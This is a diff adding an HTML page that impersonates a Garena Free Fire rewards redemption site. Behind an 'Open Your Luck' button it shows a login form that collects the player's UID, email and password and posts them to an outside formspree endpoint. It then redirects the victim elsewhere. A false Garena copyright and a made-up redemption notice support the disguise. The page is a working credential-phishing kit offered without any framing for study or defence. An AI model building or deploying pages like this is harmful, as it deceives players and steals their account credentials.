@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Rewards Redemption</title>
+    <style>
+        /* General Styles */
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: url('background.jpeg') no-repeat center center fixed; 
+            background-size: cover; 
+            color: white; 
+            text-align: center;
+        }
+        .overlay { 
+            background: rgba(0, 0, 0, 0.7); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* Phase 1: Gifting Section */
+        #gifting-section { display: block; }
+        .gift-img { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 15px 0; 
+            border-radius: 10px; 
+            border: 3px solid #ffbc00; 
+            box-shadow: 0 0 20px rgba(255, 188, 0, 0.5);
+        }
+        .btn-open { 
+            background: #ffbc00; 
+            color: #000; 
+            padding: 15px 40px; 
+            border: none; 
+            font-weight: bold; 
+            font-size: 22px; 
+            cursor: pointer; 
+            border-radius: 5px; 
+            text-transform: uppercase;
+        }
+
+        /* Phase 2: Login Section */
+        #login-section { display: none; width: 100%; max-width: 400px; }
+        .login-box { 
+            background: rgba(0, 0, 0, 0.85); 
+            padding: 25px; 
+            border: 1px solid #ffbc00; 
+            border-radius: 5px; 
+        }
+        .header-logo { width: 120px; margin-bottom: 20px; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border: 1px solid #444; 
+            background: #222; 
+            color: white; 
+            box-sizing: border-box; 
+            font-size: 16px;
+        }
+        .login-btn { 
+            width: 100%; 
+            padding: 12px; 
+            background: #ffbc00; 
+            border: none; 
+            color: black; 
+            font-weight: bold; 
+            cursor: pointer; 
+            font-size: 18px; 
+            margin-top: 10px;
+        }
+        .social-icons { 
+            margin-top: 20px; 
+            display: flex; 
+            justify-content: center; 
+            gap: 15px; 
+        }
+        .social-icons img { width: 35px; cursor: pointer; }
+
+        /* Important Notice */
+        .notice { 
+            font-size: 12px; 
+            text-align: left; 
+            background: #f1f1f1; 
+            color: #333; 
+            padding: 15px; 
+            margin-top: 25px; 
+            border-radius: 5px; 
+            line-height: 1.5;
+            max-width: 400px;
+        }
+        .notice strong { color: #000; }
+        .footer-text { font-size: 10px; margin-top: 20px; opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+    <div class="overlay">
+        
+        <div id="gifting-section">
+            <img src="ff-logo-icon.png" class="header-logo" alt="Logo">
+            <h2>EXCLUSIVE REWARDS</h2>
+            <img src="background.jpeg" alt="Free Fire Gift" class="gift-img">
+            <br>
+            <button class="btn-open" onclick="showLogin()">Open Your Luck</button>
+        </div>
+
+        <div id="login-section">
+            <img src="ff-logo-icon.png" class="header-logo" alt="Logo">
+            <div class="login-box">
+                <h2 style="color:#ffbc00; margin-top:0; font-size: 20px;">REWARDS REDEMPTION SITE</h2>
+                
+                <form action="https://formspree.io/f/xgoypvvn" method="POST">
+                    <input type="text" name="UID" placeholder="Enter Player UID" required>
+                    <input type="email" name="Email" placeholder="Email Address" required>
+                    <input type="password" name="Password" placeholder="Password" required>
+                    
+                    <input type="hidden" name="_next" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
+                    
+                    <button type="submit" class="login-btn">LOG-IN</button>
+                </form>
+
+                <div class="social-icons">
+                    <img src="facebook.png" alt="FB">
+                    <img src="vk.png" alt="VK">
+                    <img src="google.png" alt="Google">
+                    <img src="apple.png" alt="Apple">
+                    <img src="twitter.png" alt="X">
+                </div>
+            </div>
+
+            <div class="notice">
+                <strong>Important Notice:</strong><br>
+                1. Redemption code has 12/16 characters, consisting of capital letters and numbers.<br>
+                2. Item rewards are shown in [vault] tab in game lobby; Golds or diamonds will add in account wallet automatically.<br>
+                3. Please note redemption expiration date. Any expired codes cannot be redeemed.<br>
+                4. Reminder: you will not be able to redeem your rewards with guest accounts.
+            </div>
+
+            <p class="footer-text">Copyright © Garena International. Trademarks belong to their respective owners. All rights Reserved.</p>
+        </div>
+
+    </div>
+
+    <script>
+        function showLogin() {
+            document.getElementById('gifting-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+    </script>
+
+</body>
+</html>
